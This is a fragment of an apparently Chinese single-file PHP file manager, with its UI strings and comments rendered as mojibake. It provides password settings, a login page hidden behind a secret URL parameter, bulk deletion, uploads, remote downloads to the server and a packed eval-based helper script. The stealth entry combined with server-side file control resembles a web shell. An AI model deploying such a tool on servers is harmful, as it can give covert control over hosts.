$$("c2").style.fontSize=Acolor3+"px";
addCookie('love2',Acolor1,9999999999);//��ס
addCookie('love3',Acolor2,9999999999);//��ס
addCookie('love4',Acolor3,9999999999);//��ס
}
}





var checkflag = "false";
function check(field) {
if (checkflag == "false") {
for (i = 0; i < field.length; i++) {
field[i].checked = true;}
checkflag = "true";
return "Uncheck All"; }
else {
for (i = 0; i < field.length; i++) {
field[i].checked = false; }
checkflag = "false";
return "Check All"; }
}

function getBg(element)  
{
  var rgbToHex=function(rgbarray,array){  
      if (rgbarray.length < 3) return false;  
      if (rgbarray.length == 4 && rgbarray[3] == 0 && !array) return 'transparent';  
      var hex = [];  
      for (var i = 0; i < 3; i++){  
        var bit = (rgbarray[i] - 0).toString(16);  
        hex.push((bit.length == 1) ? '0' + bit : bit);  
      }  
      return array ? hex : '#' + hex.join('');  
    }  
//---------------  
  if (typeof element == "string") element = element;  
  if (!element) return;  
  cssProperty = "backgroundColor";  
  mozillaEquivalentCSS = "background-color";  
  if (element.currentStyle)  
    var actualColor = element.currentStyle[cssProperty];  
  else  
  {  
    var cs = document.defaultView.getComputedStyle(element, null);  
    var actualColor = cs.getPropertyValue(mozillaEquivalentCSS).match(/\d{1,3}/g);  
//-----  
    actualColor = (actualColor) ? rgbToHex(actualColor) : "transparent";  
  }  
  if (actualColor == "transparent" && element.parentNode)  
    return arguments.callee(element.parentNode);  
  if (actualColor == null)  
    return "#ffffff";  
  else  
    return actualColor;  
}

function trColor1($this){
if(getBg($this)!='#ccff99'){
	$this.style.background='#f7e882';
	}
}
function trColor2($this,$color){
if(getBg($this)!='#ccff99'){
	$this.style.background=$color;
	}
}
function trColor3(obj,$color){

for(var i=0; i<obj.childNodes.length;i++){ 
	if(obj.childNodes[i].tagName=="TD"){
  for(var is=0; is<obj.childNodes[i].childNodes.length;is++){ 
  	if(obj.childNodes[i].childNodes[is].tagName=="INPUT"&&obj.childNodes[i].childNodes[is].type=="checkbox") {
       oCheckbox = obj.childNodes[i].childNodes[is];
       break;
    }
   }
 }
}
	
if(getBg(obj)=='#ccff99'){
	obj.style.background=$color;
	oCheckbox.checked=false;
	}else{
	obj.style.background='#ccff99';
	oCheckbox.checked=true;
	}
	
}



	var FixedBox=function(el){
		this.element=el;
		this.BoxY=getXY(this.element).y;
	}
	FixedBox.prototype={
		setCss:function(){
			var windowST=(document.compatMode && document.compatMode!="CSS1Compat")? document.body.scrollTop:document.documentElement.scrollTop||window.pageYOffset;
			if(windowST>this.BoxY){
				this.element.style.cssText="position:fixed; top:0px; background-color:#cdcdcd";
			}else{
				this.element.style.cssText="";
			}
		}
	};
	//�����¼�
	function addEvent(elm, evType, fn, useCapture) {
		if (elm.addEventListener) {
			elm.addEventListener(evType, fn, useCapture);
		return true;
		}else if (elm.attachEvent) {
			var r = elm.attachEvent('on' + evType, fn);
			return r;
		}
		else {
			elm['on' + evType] = fn;
		}
	}
	//��ȡԪ�ص�XY���ꣻ
	function getXY(el) {
        return document.documentElement.getBoundingClientRect && (function() {//ȡԪ�����꣬��Ԫ�ػ����ϲ�Ԫ������position relative
            var pos = el.getBoundingClientRect();
            return { x: pos.left + document.documentElement.scrollLeft, y: pos.top + document.documentElement.scrollTop };
        })() || (function() {
            var _x = 0, _y = 0;
            do {
                _x += el.offsetLeft;
                _y += el.offsetTop;
            } while (el = el.offsetParent);
            return { x: _x, y: _y };
        })();
    }
    
   
</script>
</head>

<body>
<div id="loadDiv" class="loadDiv" ><img src="?imgname=throbber100.gif"><br><br>Ŭ��������...</div> 
<div style="display:none">
 <input type="text" name="dir" size="20" id="ML">
 <iframe name="header" id="header"  target="main" src=""  width="100%" height="100px" align=middle marginwidth=0 marginheight=0 ></iframe>
</div>

<div id="smallLay" style="display:none" >

<script type="text/javascript">
        //CharMode���� 
        //����ĳ���ַ���������һ��. 
        function CharMode(iN){ 
            if (iN>=48 && iN <=57) //���� 
            return 1; 
            if (iN>=65 && iN <=90) //��д��ĸ 
            return 2; 
            if (iN>=97 && iN <=122) //Сд 
            return 4; 
            else 
            return 8; //�����ַ� 
        } 

        //bitTotal���� 
        //�������ǰ���뵱��һ���ж�����ģʽ 
        function bitTotal(num){ 
            modes=0; 
            for (i=0;i<4;i++){ 
            if (num & 1) modes++; 
            num>>>=1; 
            } 
            return modes; 
        } 

        //checkStrong���� 
        //���������ǿ�ȼ��� 

        function checkStrong(sPW){ 
            if (sPW.length<=4) 
            return 0; //����̫�� 
            Modes=0; 
            for (i=0;i<sPW.length;i++){ 
            //����ÿһ���ַ������ͳ��һ���ж�����ģʽ. 
            Modes|=CharMode(sPW.charCodeAt(i)); 
        } 

        return bitTotal(Modes); 

        } 

        //pwStrength���� 
        //���û��ſ����̻����������ʧȥ����ʱ,���ݲ�ͬ�ļ�����ʾ��ͬ����ɫ 

        function pwStrength(pwd){ 
        O_color="#eeeeee"; 
        L_color="#FF0000"; 
        M_color="#FF9900"; 
        H_color="#33CC00"; 
        if (pwd==null||pwd==''){ 
        Lcolor=Mcolor=Hcolor=O_color; 
        } 
        else{ 
        S_level=checkStrong(pwd); 
        switch(S_level) { 
        case 0: 
        Lcolor=Mcolor=Hcolor=O_color; 
        case 1: 
        Lcolor=L_color; 
        Mcolor=Hcolor=O_color; 
        break; 
        case 2: 
        Lcolor=Mcolor=M_color; 
        Hcolor=O_color; 
        break; 
        default: 
        Lcolor=Mcolor=Hcolor=H_color; 
        } 
        } 

        document.getElementById("strength_L").style.background=Lcolor; 
        document.getElementById("strength_M").style.background=Mcolor; 
        document.getElementById("strength_H").style.background=Hcolor; 
        return; 
        }
 </script>
<form action="?dir=<?=$dir;?>&bj=<?=$bj?>&fileName=<?=$fileName?>" method="post" target="header">
<table border="0" width="400" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="rgb"></div></td><td><font color="#FFFFFF">ϵͳ����</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center" height="100">
			<input value="yes" name="adminpassssj" size="2" type="hidden">
	<fieldset style="padding: 2">
	<legend>�޸�����</legend>
<table border="0" width="100%">
	<tr>
		<td width="200">�����룺<input type="password" name="adminpass_j" size="20"></td>
		<td>��</td>
	</tr>
	<tr>
		<td width="200">�����룺<input type="password" name="adminpass_new" size="20"  onKeyUp=pwStrength(this.value) onBlur=pwStrength(this.value)></td>
		<td align="center">
<table border="0" cellspacing="0" cellpadding="0" style='display:inline' title="����ǿ��,����ʹ��ǿ������ȷ��ϵͳ��ȫ!"> 
<tr align="center" bgcolor="#eeeeee"> 
<td width="35" id="strength_L">��</td> 
<td width="35" id="strength_M">��</td> 
<td width="35" id="strength_H">ǿ</td> 
</tr> 
</table> 
               </td>
	</tr>
	<tr>
		<td colspan="2">
����������<input type="text" name="color11_new" size="8" value="<?=$color11?>" title="��������ֻ����Ӣ��" onkeyup="value=value.replace(/[^a-zA-Z]/g,'')">
�����룺��<input type="text" name="color10_new" size="8" value="<?=$color10?>" title="������ֻ����Ӣ�ĺ�����" onkeyup="value=value.replace(/[^\w\.\/]/ig,'')">
                </td>
	</tr>
	<tr>
		<td colspan="2">���÷�����˵��:<br>��Ҫ��·����Ӳ���( ·��?��������=������ )������ʾ��¼����.<br>��:http://<?=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']?><?if($color11==""){echo "a";}else{echo $color11;}?>=<?if($color10==""){echo "123";}else{echo $color10;}?>  ����������</td>
	</tr>
</table>
</fieldset>
	<fieldset style="padding: 2">
	<legend>�༭����ɫ</legend>
ǰ��ɫ��<input type="text" name="color1_new" id="color1" size="5" class="color" value="<?if($_COOKIE[love2]==""){echo $color1;}else{echo $_COOKIE[love2];}?>"  onclick="colorSelect('color1','color1',event)" style="background-color: #<?if($_COOKIE[love2]==""){echo $color1;}else{echo $_COOKIE[love2];}?>">
����ɫ��<input type="text" name="color2_new"  id="color2" size="5" class="color" value="<?if($_COOKIE[love3]==""){echo $color2;}else{echo $_COOKIE[love3];}?>"  onclick="colorSelect('color2','color2',event)" style="background-color: #<?if($_COOKIE[love3]==""){echo $color2;}else{echo $_COOKIE[love3];}?>">
���ִ�С��<input type="text" name="color3_new"  id="color3" size="1" value="<?if($_COOKIE[love4]==""){echo $color3;}else{echo $_COOKIE[love4];}?>">
 <input type="button" name="B3" onclick="Scolor()" value="��ʱ������ɫ"><input type="button"  name="B3" onclick="Scolor(1)" value="�ָ���ɫ">
 </fieldset>
 	<fieldset style="padding: 2" title="flvƬ��ʶ��Ч�ʱȽϵ��������Ҫ�����ر�.">
	<legend>FLVƬ��ʶ��</legend>
 ����<input type="radio" value="1" name="color9_new" <?if($color9==1){?>checked<?}?>> �ر�<input type="radio" value="0" name="color9_new" <?if($color9==0){?>checked<?}?>>
  </fieldset>
 	<fieldset style="padding: 2" title="flvƬ��ʶ��Ч�ʱȽϵ��������Ҫ�����ر�.">
	<legend>����������</legend>
        ��������ַ��<input type="text" name="color12_new"  id="color12" size="40" value="<?=$color12?>">
        </fieldset>
<?if(file_exists('class.phpmailer.php')&&file_exists('class.smtp.php')){?>
 	<fieldset style="padding: 2">
	<legend>���SMTP����</legend>
 SMTP��������<input type="text" name="color4_new" id="color4" size="20" value="<?=$color4?>"><br>
 SMTP�û�����<input type="text" name="color5_new" id="color5" size="20" value="<?=$color5?>"><br>
 SMTP�����룺<input type="password" name="color6_new" id="color6" size="20" value="<?=$color6?>"><br>
 SMTP���˿ڣ�<input type="text" name="color7_new" id="color7" size="20" value="<?=$color7?>"><br>
 �����ļ�����  <input type="text" name="color8_new" id="color8" size="20" value="<?=$color8?>" title="���ٱ����ļ���ָ������">
	</fieldset>


<?}?>
<?if(getphpcfg('mail')=="No"&&(!file_exists('class.phpmailer.php')||!file_exists('class.smtp.php'))){echo "��������֧��Mail(),�뽫class.phpmailer.php,class.smtp.php�ϴ�����Ŀ¼.<br>";}?>
 <INPUT TYPE="submit" name="B3" onclick="Scolor()" VALUE="������������">
                </td>
	</tr>
</table>
</form> 
</div>

<div id="smallLay20" style="display:none">
<style>
#delfile,#deldir{
height:274px;
width:200px;
margin: 1px;
padding:1px;
overflow-y:scroll;
overflow-x:hidden;
border:1px solid #E7E7E7;
}
</style>
<table border="0" width="400" height="294" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="newfolder"></div></td><td><font color="#FFFFFF">����ɾ���ļ�</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center" height="274">
<table border="0" width="100%">
	<tr>
		<td height="20" bgcolor="#cccccc">Ŀ¼</div></td>
		<td height="20" bgcolor="#cccccc">�ļ�</div></td>
	</tr>
	<tr>
		<td height="274"><div id="deldir"></div></td>
		<td height="274"><div id="delfile"></div></td>
	</tr>
	<tr>
		<td align="center"><input type="button" value="ȷ��ɾ��" name="B1" onclick="delss()"></td>
		<td align="center"><input type="button" value="ȡ������" name="B2" onclick="showidg('smallLay20')">����</td>
	</tr>
</table>
                </td>
	</tr>
</table>
</div>

<div id="smallLay21" style="display:none">
<script>
////////////�ļ���ע///////////////////////
function wjbz11($name,$dir,$a){
$$('wjbzx6').value=$a;
$$('wjbzname').value=$name;
$$('wjbzdir').value=$dir;
getData("?wjbz=2&wjbzdir="+$dir+"&wjbzname="+$name,"wjbztext");
getData2("?wjbz=3&wjbzdir="+$dir+"&wjbzname="+$name,"wjbztime");
showid('smallLay21');
}

function wjbzx(a){
if(a==1){
getData2("?wjbz=4&wjbzdir="+$$('wjbzdir').value+"&wjbzname="+$$('wjbzname').value,"wjbzx3");
$$("wjbzx1").style.display="none";
$$("wjbzx2").style.display="block";
}else{
$$("wjbzx1").style.display="block";
$$("wjbzx2").style.display="none";

getData2("?wjbz=3&wjbzdir="+$$('wjbzdir').value+"&wjbzname="+$$('wjbzname').value,"wjbztime");
getData("?wjbz=2&wjbzdir="+$$('wjbzdir').value+"&wjbzname="+$$('wjbzname').value,"wjbztext");
}
}

function wjbzrl(yname){
$a=$$('wjbzx6').value;
if($a!="@"){
$$('ajaxurl').src="?iframeA=1&dir="+$a;
}
getData2("?wjbz=5&yname="+yname+"&wjbzdir="+$$('wjbzdir').value+"&wjbzname="+$$('wjbzname').value,"wjbzx3");
alert("����ɹ�!");
wjbzx(2);
}


function AddOnPos(myField, myValue)  //��괦���� 
{   
    //IE support   
    if (document.selection)   
    {   
    myField.focus();   
    sel = document.selection.createRange();   
    myValue = ""+myValue+"";   
    sel.text = myValue;   
    sel.select();   
    }   
    //MOZILLA/NETSCAPE support   
    else if (myField.selectionStart || myField.selectionStart == '0')   
    {   
    var startPos = myField.selectionStart;   
    var endPos = myField.selectionEnd;   
    // save scrollTop before insert   
    var restoreTop = myField.scrollTop;   
    myValue = ""+myValue+"";   
    myField.value = myField.value.substring(0, startPos) + myValue + myField.value.substring(endPos,myField.value.length);   
    if (restoreTop > 0)   
    {   
    // restore previous scrollTop   
    myField.scrollTop = restoreTop;   
    }   
    myField.focus();   
    myField.selectionStart = startPos + myValue.length;   
    myField.selectionEnd = startPos + myValue.length;   
    } else {   
    myField.value += myValue;   
    myField.focus();   
    }   
} 


function show(){
  var date = new Date(); //���ڶ���
  var now = "";
  now = date.getFullYear()+"��"; //��Ӣ�ľ�����
  now = now + (date.getMonth()+1)+"��"; //ȡ�µ�ʱ��ȡ���ǵ�ǰ��-1�����ȡ��ǰ��+1�Ϳ�����
  now = now + date.getDate()+"��";
  now = now + date.getHours()+"ʱ";
  now = now + date.getMinutes()+"��";
  return  now; //div��html��now����ַ��� 
  }
</script>
<div id="wjbzx1" style="display:block;">
<form method="POST" action="?wjbz=1" target="header">
<table border="0" width="600" height="360" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="menu"></div></td><td><font color="#FFFFFF">�ļ���ע: <input type="hidden" name="wjbzdir" size="15" id="wjbzdir" readonly><input type="text" name="wjbzname" size="15" id="wjbzname" readonly> <span id="wjbztime"></span></font></td></tr></table></td>
	</tr>
	<tr>
		<td height="300" bgcolor="#FFFFFF" title="ǰ100�ֽڻ����ļ��б���ʾ"><textarea rows="21" name="S1" cols="20" style="width:99%;height:100%" id="wjbztext"></textarea></td>
	</tr>
	<tr>
		<td height="20" bgcolor="#FFFFFF" title="�ļ���ע���ڸ�Ŀ¼����8db�ļ��������汸ע����.��ע�����ļ�·��Ϊʶ�����,����ļ��ƶ����߸�����ʧȥ��ע! ����ͨ���һع����������챸ע."><input type="submit" value="���汸ע" name="B1">   <input type="button" value="��������" onclick="AddOnPos($$('wjbztext'),show());"></td>
	</tr>
</table>
</form>
</div>
<div style="display:none;" id="wjbzx2">
<table border="0" width="600" height="360" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="icon_txt"></div></td><td><font color="#FFFFFF">������ʧ�ļ���ע</font></td><td align="right"><a href="javascript:wjbzx(2);">����</a>��</td></tr></table></td>
	</tr>
	<tr>
		<td height="340" bgcolor="#FFFFFF">
                  <div id="wjbzx3" style="outline:none;line-height:20px;border:1px solid #E0E0E0;height:340px;width:598px;white-space:nowrap;overflow:auto"></div>
                </td>
	</tr>
</table>
</div>
<input type="hidden" name="wjbzx6" size="20" id="wjbzx6">
</div>





<div id="smallLay3" style="display:none">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="newfolder"></div></td><td><font color="#FFFFFF">�����µ��ļ���(֧�ֽ����༶�ļ���)</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center" height="120">
<form method="POST" action="?dir=<?=urlencode($dir)?>&bj=<?=$bj?>&fileName=<?=fileName?>&B=1"  id="NEWdir"  target="header" >	
�ļ�������:<input type="text" name="T1" size="20" id="newT1" onkeydown="return disableEnter(event)">
<input type="button" value="�½��ļ���" name="B1" onclick="NEWdir()" >
</form>
                </td>
	</tr>
</table>
</div>

<div id="smallLay4" style="display:none;top:100px;">
<table border="0" width="350" height="120" cellspacing="0" cellpadding="0">
	<tr>
		<td height="20" bgcolor="#808080"><table border="0" width="100%"><tr><td width="20" align="right"><div class="newtxt"></div></td><td><font color="#FFFFFF">�����µ��ļ�</font></td></tr></table></td>
	</tr>
	<tr>
		<td  bgcolor="#FFFFFF" align="center" height="120">
<form method="POST" action="?" onkeydown="if(event.keyCode==13){return false;}" target="_blank" id="NEWfile">
<input type="radio" value="GB2312" name="encode" checked>GB2312 <input type="radio" value="UTF-8" name="encode">UTF-8</br>
�ļ�����:<input type="text" name="fileName" size="20" id="newT2" onkeydown="return disableEnter(event)">
<?if($bj==1){?>
<input type="button" value="�½��ļ�" name="B1" onclick="NEWfile()" >
<?}else{?>
<input type="button" value="�½��ļ�" name="B1" onclick="NEWfile2()">
<?}?>
</form>
                </td>
	</tr>
</table>
</div>
<div id="smallLay8" style="display:none">
<script>
var pdajax=0;
function flashajax(a){
if(csss==0){
   if(a=="flash8"){
       $$("ajax8").style.display="none";
       $$("yc8").style.display="none";
       $$("flash8").style.display="block";
       pdajax=0;
       $$("flash8").innerHTML=$$("flash82").innerHTML;
   }else if(a=="ajax8"){
       $$("flash8").style.display="none";
       $$("yc8").style.display="none";
       $$("ajax8").style.display="block";
       pdajax=1;
   }else{
       $$("flash8").style.display="none";
       $$("ajax8").style.display="none";
       $$("yc8").style.display="block";
       $$("newfname").value=$$('ML').value;
       pdajax=1;
   }
}else{
 alert("�����ϴ������л�! �����л��������"); 
}
}
var qiehuan=1;
function qiehuan1(){
if(qiehuan==1){
qiehuan=2;
$$("flashqie").innerHTML="ͼ";
}else{
qiehuan=1;
$$("flashqie").innerHTML="��";
}
$$("flash8").innerHTML=$$("flash82").innerHTML;

}
</script>
<form action="" method="post" enctype="multipart/form-data">
<table border="0" width="600" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF">
	<tr>
                <td width="40" align="center"><span id="loadpercent"></span></td>
		<td width="120" height="21" align="center"><a href="javascript:flashajax('flash8'),refreshProgress();">FLSH�����ϴ�</a> (<a href="javascript:qiehuan1(),refreshProgress();" id="flashqie">��</a>)</td>
		<td width="120" align="center"><a href="javascript:flashajax('ajax8');">AJAX�����ϴ�</a></td>
                <td width="320" title="֧��:http,https,ftp,mms,rtsp,<?="\n"?>thunder:Ѹ��,flashget:���ʿ쳵,qqdl:QQ����"><a href="javascript:flashajax('yc8');">��Э��Զ������</a></td>
	</tr>
</table>

<script language="javascript">
function challs_flash_update(){
var a={};a.title = "�����ϴ�";a.FormName = "file";a.url="<?=basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", basename(__FILE__)))?>"; a.parameter="action=urlupload&db=<?=md5(base64_encode($adminpass))?>&dir="+$$('ML').value; a.UpSize=0;a.fileNum=0;a.size=<?=intval(@get_cfg_var("upload_max_filesize"))?>;a.FormID=['select','select2'];a.autoClose=1;a.CompleteClose=true;a.repeatFile=true;a.returnServer=true;a.MD5File = 0;a.loadFileOrder=true;a.mixFileNum=0;a.ListShowType = qiehuan;a.InfoDownRight = "�ȴ��ϴ���%1%��  ���ϴ���%2%��";a.TitleSwitch = true;a.ForceFileNum=0;a.autoUpload = false;a.adjustOrder = true;a.deleteAllShow = true;return a ;
}
var bsss=1;
function challs_flash_onComplete(a){ //ÿ���ϴ���ɵ��õĺ�����������һ��Object���ͱ������������ϴ��ļ��Ĵ�С�����ƣ��ϴ�����ʱ��,�ļ�����
	var name=a.fileName; //��ȡ�ϴ��ļ���
	var size=a.fileSize; //��ȡ�ϴ��ļ���С����λ�ֽ�
	var time=a.updateTime; //��ȡ�ϴ�����ʱ�� ��λ����
	var type=a.fileType; //��ȡ�ļ����ͣ��� Windows �ϣ����������ļ���չ���� �� Macintosh �ϣ������������ĸ��ַ���ɵ��ļ�����
        document.getElementById('flashyc').innerHTML="���ϴ�"+bsss+++"��";
}

function challs_flash_onCompleteData(a){ //��ȡ������������Ϣ�¼�
	//document.getElementById('show').innerHTML+='<font color="#ff0000">�������˷�����Ϣ��</font><br />'+a+'<br />';
}
var csss=0;
function challs_flash_onStart(a){ //��ʼһ���µ��ļ��ϴ�ʱ�¼�,������һ��Object���ͱ������������ϴ��ļ��Ĵ�С�����ƣ�����
	var name=a.fileName; //��ȡ�ϴ��ļ���
	var size=a.fileSize; //��ȡ�ϴ��ļ���С����λ�ֽ�
	var type=a.fileType; //��ȡ�ļ����ͣ��� Windows �ϣ����������ļ���չ���� �� Macintosh �ϣ������������ĸ��ַ���ɵ��ļ�����
	document.getElementById('flashname').innerHTML="�����ϴ�:"+name;
        csss=1;
	return true; //���� false ʱ���������ֹͣ�ϴ�
}

function challs_flash_onCompleteAll(a){ //�ϴ��ļ��б�ȫ���ϴ�����¼�,���� a ��ֵ���ͣ������ϴ�ʧ�ܵ�����
        $dir=$$('ML').value;
        getData3('?dir='+$dir+'&A=A3',$dir,'mullu');
        bsss=1;
        csss=0;
        alert("�ϴ����! "+document.getElementById('flashgs').innerHTML+" "+document.getElementById('flashyc').innerHTML+"�ϴ�ʧ��"+a+"��");
        document.getElementById('flashyc').innerHTML="���ϴ�0��";
        document.getElementById('flashgs').innerHTML="���ϴ��ļ�0��";
        document.getElementById('flashname').innerHTML="";
}
function challs_flash_onSelectFile(a){ //�û�ѡ���ļ���ϴ����¼������� a ��ֵ���ͣ����صȴ��ϴ��ļ�����
	document.getElementById('flashgs').innerHTML='���ϴ��ļ�'+a+'��';
}

function challs_flash_deleteAllFiles(){ //��հ�ť���ʱ�������¼�
        document.getElementById('flashyc').innerHTML="���ϴ�0��";
        document.getElementById('flashgs').innerHTML="���ϴ��ļ�0��";
        document.getElementById('flashname').innerHTML="";
        bsss=1;
        csss=0;
	//���� true ��գ�false �����
	return confirm("��ȷ��Ҫ����б���?");
}

function challs_flash_onError(a){ //�ϴ��ļ����������¼���������һ��Object���ͱ��������������ļ��Ĵ�С�����ƣ�����
	var err=a.textErr; //������Ϣ
	var name=a.fileName; //��ȡ�ϴ��ļ���
	var size=a.fileSize; //��ȡ�ϴ��ļ���С����λ�ֽ�
	var type=a.fileType; //��ȡ�ļ����ͣ��� Windows �ϣ����������ļ���չ���� �� Macintosh �ϣ������������ĸ��ַ���ɵ��ļ�����
}

function challs_flash_FormData(a){ // ʹ��FormID����ʱ��Ҫ����
	try{
		var value = '';
		var id=document.getElementById(a);
		if(id.type == 'radio'){
			var name = document.getElementsByName(id.name);
			for(var i = 0;i<name.length;i++){
				if(name[i].checked){
					value = name[i].value;
				}
			}
		}else if(id.type == 'checkbox'){
			var name = document.getElementsByName(id.name);
			for(var i = 0;i<name.length;i++){
				if(name[i].checked){
					if(i>0) value+=",";
					value += name[i].value;
				}
			}
		}else{
			value = id.value;
		}
		return value;
	 }catch(e){
		return '';
	 }
}

function challs_flash_style(){ //�����ɫ��ʽ���ú���
	var a = {};
	
	/*  ���屳����ɫ��ʽ */
	a.backgroundColor=['#eeeeee','#eeeeee','#eeeeee'];	//��ɫ���ã�3����ɫ֮�����
	a.backgroundLineColor='#ebebeb';					//�����߿�����ɫ
	a.backgroundFontColor='#000000';					//����������������ɫ
	a.backgroundInsideColor='#FFFFFF';					//����ڿ򱳾���ɫ
	a.backgroundInsideLineColor=['#ebebeb','#cccccc'];	//����ڿ�����ɫ��2����ɫ֮�����
	a.upBackgroundColor='#ffffff';						//�Ϸ���ť������ɫ����
	a.upOutColor='#000000';								//�Ϸ���ť��ͷ����뿪ʱ��ɫ����
	a.upOverColor='#FF0000';							//�Ϸ���ť��ͷ����ƶ���ȥ��ɫ����
	a.downBackgroundColor='#ffffff';					//�·���ť������ɫ����
	a.downOutColor='#000000';							//�·���ť��ͷ����뿪ʱ��ɫ����
	a.downOverColor='#FF0000';							//�·���ť��ͷ����ƶ���ȥʱ��ɫ����
	
	/*  ͷ����ɫ��ʽ */
	a.Top_backgroundColor=['#cccccc','#888888']; 		//��ɫ���ã��������ͣ�2����ɫ֮�����
	a.Top_fontColor='#ffffff';							//ͷ��������ɫ
	
	
	/*  ��ť��ɫ��ʽ */
	a.button_overColor=['#EEEEEE','#444444'];			//�������ȥʱ�ı�����ɫ��2����ɫ֮�����
	a.button_overLineColor='#ebebeb';					//�������ȥʱ�ı߿���ɫ
	a.button_overFontColor='#ffffff';					//�������ȥʱ��������ɫ
	a.button_outColor=['#ffffff','#999999']; 			//����뿪ʱ�ı�����ɫ��2����ɫ֮�����
	a.button_outLineColor='#ebebeb';					//����뿪ʱ�ı߿���ɫ
	a.button_outFontColor='#ffffff';					//����뿪ʱ��������ɫ
	
	/* �ļ��б���ʽ */
	a.List_scrollBarColor="#000000"						//�б���������ɫ
	a.List_backgroundColor='#EAF0F8';					//�б�����ɫ
	a.List_fontColor='#333333';							//�б�������ɫ
	a.List_LineColor='#B3CDF1';							//�б��ָ�����ɫ
	a.List_cancelOverFontColor='#ff0000';				//�б�ȡ����������ȥʱ��ɫ
	a.List_cancelOutFontColor='#D76500';				//�б�ȡ�������뿪ʱ��ɫ
	a.List_progressBarLineColor='#B3CDF1';				//�������߿�����ɫ
	a.List_progressBarBackgroundColor='#D8E6F7';		//������������ɫ	
	a.List_progressBarColor=['#FFCC00','#FFFF00'];		//������������ɫ��2����ɫ֮�����
	/* ������ʾ����ʽ */
	a.Err_backgroundColor='#C0D3EB';					//��ʾ�򱳾�ɫ
	a.Err_LineColor='#5D7CBB';							//��ʾ��߿��߾�ɫ
	a.Err_cancelOverColor='#0066CC';					//��ʾ��ȡ����ť����ȥʱ��ɫ
	a.Err_cancelOutColor='#FF0000';						//��ʾ��ȡ����ť�뿪ʱ��ɫ
	a.Err_fontColor='#245891';							//��ʾ��������ɫ
	return a;
}
var isMSIE = (navigator.appName == "Microsoft Internet Explorer");   
function thisMovie(movieName){   
  if(isMSIE){   
  	return window[movieName];   
  }else{
  	return document[movieName];   
  }   
}
</script>
<div id="flash8"></div>

<div id="flash82" style="display:none;">
<div id="showSWF" style="height:302px;overflow:hidden;background:#eee;width:600px;">


<object id="flashgame" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0" width="600" height="320" id="update" align="middle">
<param name="allowFullScreen" value="false" />
    <param name="allowScriptAccess" value="always" />
    <param name="movie" value="?imgname=8update.swf" />
    <param name="quality" value="high" />
    <param name="bgcolor" value="#eeeeee" />
    <embed src="?imgname=8update.swf" quality="high" bgcolor="#eeeeee" width="600" height="320" name="update" align="middle" allowScriptAccess="always" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
</object>


<script language="javascript"> 
function show()//����AD�㡢��ʾFLASH�� 
{ 
document.getElementById("loadpercent").style.display='none'; 
} 

function refreshProgress()//ˢ�½��������� 
{ 
var downProgressWidth=40; 
document.getElementById("loadpercent").style.display='block'; 
var bar = document.getElementById("loadpercent"); 
var movie = document.getElementById("flashgame"); 
var nPercentLoaded = Math.abs(movie.PercentLoaded()); 
bar.style.width=Math.ceil(downProgressWidth*nPercentLoaded/100) +"px"; 
bar.innerHTML= nPercentLoaded +"%"; 
if(nPercentLoaded==100) 
{ 
bar.style.width=(downProgressWidth-2) + "px"; show(); 
} 
else 
{ 
setTimeout('refreshProgress()',0); 
} 
}
</script>

</div>
<div style="background:#eee;height:20px;width:600px;">
����<span id="flashgs">���ϴ��ļ�0��</span>��<span id="flashyc">���ϴ�0��</span>  ������<span id="flashname"></span>
</div>
</div>

<div id="ajax8" style="display:none;">
<script>
eval(function(p,a,c,k,e,r){e=function(c){return(c<62?'':e(parseInt(c/62)))+((c=c%62)>35?String.fromCharCode(c+29):c.toString(36))};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'([3-59cf-hj-mo-rt-yCG-NP-RT-Z]|[12]\\w)'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('5 $$,$$B,$$A,$$F,$$D,$$E,$$S;(3(){5 O,B,A,F,D,E,S;O=3(id){4"1L"==1t id?P.getElementById(id):id};O.extend=3(G,10){H(5 Q R 10){G[Q]=10[Q]}4 G};O.deepextend=3(G,10){H(5 Q R 10){5 17=10[Q];9(G===17)continue;9(1t 17==="c"){G[Q]=I.callee(G[Q]||{},17)}J{G[Q]=17}}4 G};B=(3(K){5 b={11:/11/.x(K)&&!/1u/.x(K),1u:/1u/.x(K),1M:/webkit/.x(K)&&!/1v/.x(K),1N:/1N/.x(K),1v:/1v/.x(K)};5 1i="";H(5 i R b){9(b[i]){1i="1M"==i?"18":i;19}}b.18=1i&&1w("(?:"+1i+")[\\\\/: ]([\\\\d.]+)").x(K)?1w.$1:"0";b.ie=b.11;b.1O=b.11&&1y(b.18)==6;b.ie7=b.11&&1y(b.18)==7;b.1P=b.11&&1y(b.18)==8;4 b})(1z.navigator.userAgent.toLowerCase());A=3(){5 l={isArray:3(1Q){4 Object.1R.toString.L(1Q)==="[c 1S]"},1A:3(C,12,p){9(C.1A){4 C.1A(12)}J{5 M=C.1a;p=1T(p)?0:(p<0)?1j.1U(p)+M:1j.1V(p);H(;p<M;p++){9(C[i]===12)4 i}4-1}},1B:3(C,12,p){9(C.1B){4 C.1B(12)}J{5 M=C.1a;p=1T(p)||p>=M-1?M-1:p<0?1j.1U(p)+M:1j.1V(p);H(;p>-1;p--){9(C[i]===12)4 i}4-1}}};3 X(c,q){9(undefined===c.1a){H(5 f R 